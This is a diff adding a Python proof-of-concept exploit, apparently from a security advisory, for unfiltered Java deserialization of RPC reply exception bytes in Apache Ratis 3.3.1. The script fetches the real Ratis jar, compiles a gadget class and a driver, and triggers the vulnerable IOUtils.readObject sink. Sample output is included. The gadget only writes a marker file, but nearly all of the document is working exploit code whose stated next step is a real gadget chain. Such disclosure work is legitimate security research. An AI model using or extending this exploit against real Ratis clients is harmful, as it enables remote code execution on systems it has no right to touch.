@@ -1,0 +1,219 @@
+#!/usr/bin/env python
+#
+#
+# Apache Ratis 3.3.1 Java Deserialization
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://ratis.apache.org
+# Affected version: 3.3.1 and 3.3.0
+#
+# Summary: Apache Ratis is a highly customizable Raft protocol implementation
+# in Java. Raft is a easily understandable consensus algorithm to manage replicated
+# state. Apache Ratis could be used in any Java application where state should
+# be replicated between multiple instances.
+#
+# Desc: Apache Ratis suffers from an unsafe Java deserialization vulnerability
+# in its RPC error handling. The cause and stack-trace bytes carried in an RPC
+# reply exception are deserialized through IOUtils.readObject with no class filtering,
+# so a malicious server (or a man-in-the-middle) can return a crafted exception
+# whose bytes are deserialized in the receiving client. A gadget chain was run
+# through the real IOUtils.readObject in ratis-3.3.1. This can result in remote
+# code execution against a Ratis client where a suitable gadget is present on the
+# client classpath. The trust precondition is a compromised/malicious server or
+# MITM, so a peer-trust rebuttal is likely.
+#
+# ================================================================================
+# > python ratis_poc.py
+# [*] Step 1/4: fetching the real vendor jar from Maven Central (ratis 3.3.1, latest)
+#     [>] ratis-common-3.3.1.jar
+#     [>] slf4j-api-1.7.36.jar
+# [*] Step 2/4: writing Java sources
+# [*] Step 3/4: compiling
+# [*] Step 4/4: running against the real IOUtils.readObject sink
+# --------------------------------------------------------------------
+# [*] Malicious reply 'cause' ByteString length = 71  (as ProtoUtils.writeObject2ByteString would produce)
+# [*] Victim client calls the REAL org.apache.ratis.util.IOUtils.readObject()...
+# >>> EvilGadget.readObject() EXECUTING on the Ratis client JVM
+# [*] readObject returned: EvilGadget  (non-Throwable object deserialized -> sink is UNFILTERED)
+# --------------------------------------------------------------------
+#
+# [+] TRIGGERED: attacker-controlled object's readObject() ran inside the real Ratis sink.
+#     Proof file RATIS_PWNED.txt:
+#       >>> code ran during Ratis reply deserialization @ Tue Oct 07 01:23:06 CEST 2026
+#
+#     (EvilGadget is a benign demonstrator. Full RCE needs a real gadget on the Ratis
+#      CLIENT classpath + the attacker on the server side / MITM of the plaintext link.)
+#
+# [*] Artifacts left in place: C:\Users\ratis_reply_deser_rce\work
+# ================================================================================
+#
+# Tested on: Microsoft Windows 10 (x86_64)
+#            Eclipse Temurin OpenJDK 21.0.6 (LTS)
+#            SLF4J 1.7.36
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6010
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6010
+#
+#
+# 13.08.2026
+#
+
+
+#            .______________________.
+#            o_________MoAB_________o
+             #                      #
+             #           O/         #
+             #          /|          #
+             #          / \         #
+import os    #_____________________ o
+import sys    #_____________________ o
+import shutil    #______________________ o
+import subprocess    #________________________ o
+import urllib.request    #________________________ o
+
+r"""
+Apache Ratis 3.3.1 (latest) - unfiltered Java deserialization of RPC-reply exception bytes
+(ProtoUtils.toObject -> org.apache.ratis.util.IOUtils.readObject).
+
+What it does:
+  1. Downloads the REAL vendor jar from Maven Central (ratis-common 3.3.1, the latest release -
+     its IOUtils.readObject is still unfiltered) plus slf4j-api.
+  2. Emits a benign demonstrator gadget EvilGadget.java and a driver.
+  3. The driver serializes EvilGadget with a standard ObjectOutputStream - exactly what a
+     malicious/compromised Ratis SERVER (or a MITM on the plaintext client link) does via
+     ProtoUtils.writeObject2ByteString when it puts an object in a reply's exception
+     cause/stackTrace ByteString.
+  4. It then feeds those bytes to the REAL org.apache.ratis.util.IOUtils.readObject(in, Object.class)
+     - the exact sink ProtoUtils.toObject calls when a Ratis CLIENT parses a RaftClientReplyProto.
+     The sink has no ObjectInputFilter, so EvilGadget.readObject() runs (writes RATIS_PWNED.txt)
+     before any Throwable/StackTraceElement cast. The script verifies that file exists.
+"""
+
+RATIS_VERSION = "3.3.1"
+SLF4J_VERSION = "1.7.36"
+CENTRAL = "https://repo1.maven.org/maven2"
+
+JARS = {
+    f"ratis-common-{RATIS_VERSION}.jar":
+        f"{CENTRAL}/org/apache/ratis/ratis-common/{RATIS_VERSION}/ratis-common-{RATIS_VERSION}.jar",
+    f"slf4j-api-{SLF4J_VERSION}.jar":
+        f"{CENTRAL}/org/slf4j/slf4j-api/{SLF4J_VERSION}/slf4j-api-{SLF4J_VERSION}.jar",
+}
+
+GADGET_JAVA = r"""
+import java.io.*;
+import java.nio.file.*;
+import java.nio.charset.StandardCharsets;
+
+public class EvilGadget implements Serializable {
+    private static final long serialVersionUID = 1L;
+    public String note = "ratis-poc";
+    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+        in.defaultReadObject();
+        System.out.println(">>> EvilGadget.readObject() EXECUTING on the Ratis client JVM");
+        try {
+            Files.write(Paths.get("RATIS_PWNED.txt"),
+                (">>> code ran during Ratis reply deserialization @ " + new java.util.Date() + "\n")
+                    .getBytes(StandardCharsets.UTF_8),
+                StandardOpenOption.CREATE, StandardOpenOption.APPEND);
+        } catch (Exception e) { /* ignore */ }
+    }
+}
+"""
+
+DRIVER_JAVA = r"""
+import java.io.*;
+import java.lang.reflect.Method;
+
+public class Driver {
+    public static void main(String[] args) throws Exception {
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
+            oos.writeObject(new EvilGadget());
+        }
+        byte[] wire = bos.toByteArray();
+        System.out.println("[*] Malicious reply 'cause' ByteString length = " + wire.length
+            + "  (as ProtoUtils.writeObject2ByteString would produce)");
+
+        System.out.println("[*] Victim client calls the REAL org.apache.ratis.util.IOUtils.readObject()...");
+        Class<?> ioutils = Class.forName("org.apache.ratis.util.IOUtils");
+        Method readObject = ioutils.getDeclaredMethod("readObject", InputStream.class, Class.class);
+        readObject.setAccessible(true);
+        try {
+            Object result = readObject.invoke(null, new ByteArrayInputStream(wire), Object.class);
+            System.out.println("[*] readObject returned: "
+                + (result == null ? "null" : result.getClass().getName())
+                + "  (non-Throwable object deserialized -> sink is UNFILTERED)");
+        } catch (java.lang.reflect.InvocationTargetException e) {
+            System.out.println("[*] sink threw AFTER gadget execution (expected for some payloads): " + e.getCause());
+        }
+    }
+}
+"""
+
+def download(url, dest):
+    if os.path.exists(dest) and os.path.getsize(dest) > 0:
+        print(f"    [=] cached {os.path.basename(dest)}")
+        return
+    print(f"    [>] {os.path.basename(dest)}")
+    req = urllib.request.Request(url, headers={"User-Agent": "ratis-poc/7.10"})
+    with urllib.request.urlopen(req, timeout=60) as r, open(dest, "wb") as f:
+        shutil.copyfileobj(r, f)
+    if os.path.getsize(dest) == 0:
+        raise RuntimeError(f"empty download: {url}")
+
+def main():
+    for t in ("java", "javac"):
+        if shutil.which(t) is None:
+            sys.exit(f"[!] '{t}' not found on PATH. Install a JDK (e.g. Temurin) and retry.")
+
+    work = os.path.join(os.path.dirname(os.path.abspath(__file__)), "work")
+    lib = os.path.join(work, "lib")
+    os.makedirs(lib, exist_ok=True)
+
+    print(f"[*] Step 1/4: fetching the real vendor jar from Maven Central (ratis {RATIS_VERSION}, latest)")
+    for name, url in JARS.items():
+        download(url, os.path.join(lib, name))
+
+    print("[*] Step 2/4: writing Java sources")
+    with open(os.path.join(work, "EvilGadget.java"), "w", encoding="utf-8") as f:
+        f.write(GADGET_JAVA)
+    with open(os.path.join(work, "Driver.java"), "w", encoding="utf-8") as f:
+        f.write(DRIVER_JAVA)
+
+    cp = os.pathsep.join([os.path.join("lib", n) for n in JARS] + ["."])
+    marker = os.path.join(work, "RATIS_PWNED.txt")
+    if os.path.exists(marker):
+        os.remove(marker)
+
+    print("[*] Step 3/4: compiling")
+    if subprocess.run(["javac", "-cp", cp, "EvilGadget.java", "Driver.java"], cwd=work).returncode != 0:
+        sys.exit("[!] compilation failed")
+
+    print("[*] Step 4/4: running against the real IOUtils.readObject sink\n" + "-" * 68)
+    subprocess.run(["java", "-cp", cp, "Driver"], cwd=work)
+    print("-" * 68)
+
+    if os.path.exists(marker) and os.path.getsize(marker) > 0:
+        print("\n[+] TRIGGERED: attacker-controlled object's readObject() ran inside the real Ratis sink.")
+        print("    Proof file RATIS_PWNED.txt:")
+        with open(marker, encoding="utf-8") as f:
+            for line in f:
+                print("      " + line.rstrip())
+        print("\n    (EvilGadget is a benign demonstrator. Full RCE needs a real gadget on the Ratis")
+        print("     CLIENT classpath + the attacker on the server side / MITM of the plaintext link.)")
+        print(f"\n[*] Artifacts left in place: {work}")
+        sys.exit(0)
+    else:
+        print("\n[-] No proof file produced - the gadget did not execute.")
+        print(f"\n[*] Artifacts left in place: {work}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
